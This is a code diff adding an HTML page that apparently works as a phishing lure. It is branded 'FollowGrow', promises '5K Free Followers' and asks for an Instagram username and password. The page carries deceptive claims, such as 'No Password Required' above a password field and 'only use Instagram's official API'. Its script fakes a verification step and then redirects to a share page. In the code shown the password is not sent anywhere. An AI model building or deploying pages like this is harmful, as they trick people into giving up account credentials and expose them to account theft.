@@ -1,0 +1,550 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Instagram Login - Claim 5K Free Followers</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+    
+    body {
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 2rem;
+    }
+    
+    .login-container {
+      background: white;
+      border-radius: 15px;
+      box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+      overflow: hidden;
+      width: 100%;
+      max-width: 900px;
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+    }
+    
+    /* Left Side - Illustration/Info */
+    .login-left {
+      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+      color: white;
+      padding: 3rem 2rem;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      text-align: center;
+    }
+    
+    .login-left h2 {
+      font-size: 2rem;
+      margin-bottom: 1.5rem;
+      font-weight: 700;
+    }
+    
+    .login-left p {
+      font-size: 0.95rem;
+      line-height: 1.8;
+      opacity: 0.9;
+      margin-bottom: 2rem;
+    }
+    
+    .benefits-list {
+      text-align: left;
+      display: flex;
+      flex-direction: column;
+      gap: 1rem;
+    }
+    
+    .benefit-item {
+      display: flex;
+      align-items: center;
+      gap: 1rem;
+      font-size: 0.9rem;
+    }
+    
+    .benefit-check {
+      width: 30px;
+      height: 30px;
+      background: rgba(255, 255, 255, 0.3);
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      flex-shrink: 0;
+      font-weight: bold;
+    }
+    
+    /* Right Side - Login Form */
+    .login-right {
+      padding: 3rem 2rem;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+    }
+    
+    .login-header {
+      text-align: center;
+      margin-bottom: 2rem;
+    }
+    
+    .logo-text {
+      font-size: 1.8rem;
+      font-weight: 700;
+      color: #667eea;
+      margin-bottom: 0.5rem;
+    }
+    
+    .login-subtitle {
+      color: #666;
+      font-size: 0.9rem;
+    }
+    
+    .form-group {
+      margin-bottom: 1.5rem;
+    }
+    
+    .form-group label {
+      display: block;
+      margin-bottom: 0.5rem;
+      color: #1a1a1a;
+      font-weight: 600;
+      font-size: 0.9rem;
+    }
+    
+    .form-group input {
+      width: 100%;
+      padding: 0.75rem 1rem;
+      border: 2px solid #e0e0e0;
+      border-radius: 8px;
+      font-size: 0.95rem;
+      transition: all 0.3s ease;
+      font-family: inherit;
+    }
+    
+    .form-group input:focus {
+      outline: none;
+      border-color: #667eea;
+      box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
+    }
+    
+    .form-group input::placeholder {
+      color: #999;
+    }
+    
+    .password-toggle {
+      position: relative;
+    }
+    
+    .password-toggle-btn {
+      position: absolute;
+      right: 12px;
+      top: 38px;
+      background: none;
+      border: none;
+      cursor: pointer;
+      color: #666;
+      font-size: 0.9rem;
+      transition: color 0.3s;
+    }
+    
+    .password-toggle-btn:hover {
+      color: #667eea;
+    }
+    
+    .forgot-password {
+      text-align: right;
+      margin-bottom: 1.5rem;
+    }
+    
+    .forgot-password a {
+      color: #667eea;
+      text-decoration: none;
+      font-size: 0.85rem;
+      font-weight: 600;
+      transition: color 0.3s;
+    }
+    
+    .forgot-password a:hover {
+      color: #764ba2;
+    }
+    
+    .login-btn {
+      width: 100%;
+      padding: 0.85rem 1.5rem;
+      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+      color: white;
+      border: none;
+      border-radius: 8px;
+      font-size: 0.95rem;
+      font-weight: 600;
+      cursor: pointer;
+      transition: all 0.3s ease;
+      text-transform: uppercase;
+      letter-spacing: 1px;
+    }
+    
+    .login-btn:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 10px 25px rgba(102, 126, 234, 0.3);
+    }
+    
+    .login-btn:active {
+      transform: translateY(0);
+    }
+    
+    .divider {
+      display: flex;
+      align-items: center;
+      gap: 1rem;
+      margin: 2rem 0;
+      color: #999;
+    }
+    
+    .divider::before,
+    .divider::after {
+      content: "";
+      flex: 1;
+      height: 1px;
+      background: #e0e0e0;
+    }
+    
+    .social-login {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 1rem;
+      margin-bottom: 1.5rem;
+    }
+    
+    .social-btn {
+      padding: 0.75rem 1rem;
+      border: 2px solid #e0e0e0;
+      background: white;
+      border-radius: 8px;
+      cursor: pointer;
+      font-weight: 600;
+      font-size: 0.85rem;
+      transition: all 0.3s ease;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 0.5rem;
+    }
+    
+    .social-btn:hover {
+      border-color: #667eea;
+      color: #667eea;
+    }
+    
+    .signup-link {
+      text-align: center;
+      color: #666;
+      font-size: 0.85rem;
+      margin-top: 1.5rem;
+    }
+    
+    .signup-link a {
+      color: #667eea;
+      text-decoration: none;
+      font-weight: 600;
+      transition: color 0.3s;
+    }
+    
+    .signup-link a:hover {
+      color: #764ba2;
+    }
+    
+    .info-box {
+      background: #e3f2fd;
+      border-left: 4px solid #667eea;
+      padding: 1rem;
+      border-radius: 8px;
+      margin-top: 1.5rem;
+      font-size: 0.85rem;
+      color: #1565c0;
+      line-height: 1.6;
+    }
+    
+    .info-icon {
+      font-size: 1.2rem;
+      margin-right: 0.5rem;
+    }
+    
+    /* Responsive */
+    @media (max-width: 768px) {
+      .login-container {
+        grid-template-columns: 1fr;
+      }
+      
+      .login-left {
+        padding: 2rem;
+        min-height: 300px;
+      }
+      
+      .login-left h2 {
+        font-size: 1.5rem;
+      }
+      
+      .login-right {
+        padding: 2rem;
+      }
+      
+      .social-login {
+        grid-template-columns: 1fr;
+      }
+    }
+    
+    /* Loading State */
+    .login-btn.loading {
+      opacity: 0.7;
+      cursor: not-allowed;
+    }
+    
+    .spinner {
+      display: inline-block;
+      width: 16px;
+      height: 16px;
+      border: 2px solid rgba(255, 255, 255, 0.3);
+      border-radius: 50%;
+      border-top-color: white;
+      animation: spin 0.8s linear infinite;
+    }
+    
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+    
+    .error-message {
+      background: #ffebee;
+      color: #c62828;
+      padding: 0.75rem 1rem;
+      border-radius: 8px;
+      margin-bottom: 1rem;
+      font-size: 0.85rem;
+      display: none;
+    }
+    
+    .error-message.show {
+      display: block;
+    }
+    
+    .success-message {
+      background: #e8f5e9;
+      color: #2e7d32;
+      padding: 0.75rem 1rem;
+      border-radius: 8px;
+      margin-bottom: 1rem;
+      font-size: 0.85rem;
+      display: none;
+    }
+    
+    .success-message.show {
+      display: block;
+    }
+  </style>
+</head>
+<body>
+  <div class="login-container">
+    <!-- Left Side -->
+    <div class="login-left">
+      <h2>Unlock Your 5K Followers</h2>
+      <p>Complete your Instagram login to claim your free followers instantly. It takes less than 2 minutes!</p>
+      
+      <div class="benefits-list">
+        <div class="benefit-item">
+          <div class="benefit-check">✓</div>
+          <div>5,000 Real Followers</div>
+        </div>
+        <div class="benefit-item">
+          <div class="benefit-check">✓</div>
+          <div>Instant Delivery (24 hours)</div>
+        </div>
+        <div class="benefit-item">
+          <div class="benefit-check">✓</div>
+          <div>100% Safe & Secure</div>
+        </div>
+        <div class="benefit-item">
+          <div class="benefit-check">✓</div>
+          <div>No Password Required</div>
+        </div>
+        <div class="benefit-item">
+          <div class="benefit-check">✓</div>
+          <div>24/7 Support</div>
+        </div>
+      </div>
+    </div>
+    
+    <!-- Right Side -->
+    <div class="login-right">
+      <div class="login-header">
+        <div class="logo-text">📷 FollowGrow</div>
+        <div class="login-subtitle">Secure Instagram Login</div>
+      </div>
+      
+      <div class="error-message" id="errorMessage"></div>
+      <div class="success-message" id="successMessage"></div>
+      
+      <form id="loginForm">
+        <div class="form-group">
+          <label for="username">Instagram Username</label>
+          <input 
+            type="text" 
+            id="username" 
+            name="username"
+            placeholder="@your_username"
+            required
+          >
+        </div>
+        
+        <div class="form-group password-toggle">
+          <label for="password">Password</label>
+          <input 
+            type="password" 
+            id="password" 
+            name="password"
+            placeholder="Enter your password"
+            required
+          >
+          <button type="button" class="password-toggle-btn" id="togglePassword">Show</button>
+        </div>
+        
+        <div class="forgot-password">
+          <a href="#forgot">Forgot password?</a>
+        </div>
+        
+        <button type="submit" class="login-btn" id="loginBtn">
+          Login to Claim Followers
+        </button>
+      </form>
+      
+      <div class="divider">or</div>
+      
+      <div class="social-login">
+        <button class="social-btn" id="googleBtn">
+          <span>G</span> Google
+        </button>
+        <button class="social-btn" id="facebookBtn">
+          <span>f</span> Facebook
+        </button>
+      </div>
+      
+      <div class="info-box">
+        <span class="info-icon">🔐</span>
+        <strong>Your data is safe:</strong> We never store passwords and only use Instagram's official API to verify your account.
+      </div>
+      
+      <div class="signup-link">
+        Don't have an account? <a href="#signup">Create one here</a>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    // Password Toggle
+    const togglePasswordBtn = document.getElementById('togglePassword');
+    const passwordInput = document.getElementById('password');
+    
+    togglePasswordBtn.addEventListener('click', function(e) {
+      e.preventDefault();
+      const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
+      passwordInput.setAttribute('type', type);
+      togglePasswordBtn.textContent = type === 'password' ? 'Show' : 'Hide';
+    });
+    
+    // Form Submission
+    const loginForm = document.getElementById('loginForm');
+    const loginBtn = document.getElementById('loginBtn');
+    const errorMessage = document.getElementById('errorMessage');
+    const successMessage = document.getElementById('successMessage');
+    
+    loginForm.addEventListener('submit', function(e) {
+      e.preventDefault();
+      
+      const username = document.getElementById('username').value.trim();
+      const password = document.getElementById('password').value;
+      
+      // Clear messages
+      errorMessage.classList.remove('show');
+      successMessage.classList.remove('show');
+      
+      // Validation
+      if (!username || !password) {
+        showError('Please fill in all fields');
+        return;
+      }
+      
+      if (username.length < 3) {
+        showError('Username must be at least 3 characters');
+        return;
+      }
+      
+      if (password.length < 6) {
+        showError('Password must be at least 6 characters');
+        return;
+      }
+      
+      // Simulate API call
+      loginBtn.classList.add('loading');
+      loginBtn.innerHTML = '<span class="spinner"></span> Verifying...';
+      
+      setTimeout(() => {
+        loginBtn.classList.remove('loading');
+        loginBtn.textContent = 'Login to Claim Followers';
+        
+        // Success
+        showSuccess(`Welcome @${username}! Your followers are being processed. Check your email for updates.`);
+        
+        // Redirect after 2 seconds
+        setTimeout(() => {
+          window.location.href = 'share.html?username=' + encodeURIComponent(username);
+        }, 2000);
+      }, 1500);
+    });
+    
+    // Google Login
+    document.getElementById('googleBtn').addEventListener('click', function(e) {
+      e.preventDefault();
+      alert('Google login integration would go here');
+    });
+    
+    // Facebook Login
+    document.getElementById('facebookBtn').addEventListener('click', function(e) {
+      e.preventDefault();
+      alert('Facebook login integration would go here');
+    });
+    
+    function showError(message) {
+      errorMessage.textContent = message;
+      errorMessage.classList.add('show');
+      errorMessage.scrollIntoView({ behavior: 'smooth', block: 'center' });
+    }
+    
+    function showSuccess(message) {
+      successMessage.textContent = message;
+      successMessage.classList.add('show');
+      successMessage.scrollIntoView({ behavior: 'smooth', block: 'center' });
+    }
+    
+    // Auto-format username
+    const usernameInput = document.getElementById('username');
+    usernameInput.addEventListener('input', function() {
+      let value = this.value;
+      // Remove @ if user types it
+      if (value.startsWith('@')) {
+        value = value.substring(1);
+      }
+      // Only allow alphanumeric, dots, and underscores
+      value = value.replace(/[^a-zA-Z0-9._]/g, '');
+      this.value = value;
+    });
+  </script>
+</body>
+</html>
